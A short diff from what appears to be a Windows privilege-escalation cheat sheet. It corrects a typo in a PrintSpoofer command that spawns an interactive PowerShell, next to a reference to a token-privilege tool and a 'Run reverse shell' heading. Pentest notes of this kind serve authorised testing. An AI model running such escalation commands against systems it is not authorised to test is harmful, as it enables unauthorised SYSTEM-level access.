@@ -157,7 +157,7 @@ https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/Enable
 
 Interactive shell on same session
 
-    .\PrintSoofer64.exe -i -c powershell
+    .\PrintSpoofer64.exe -i -c powershell
 
 Run reverse shell 
 
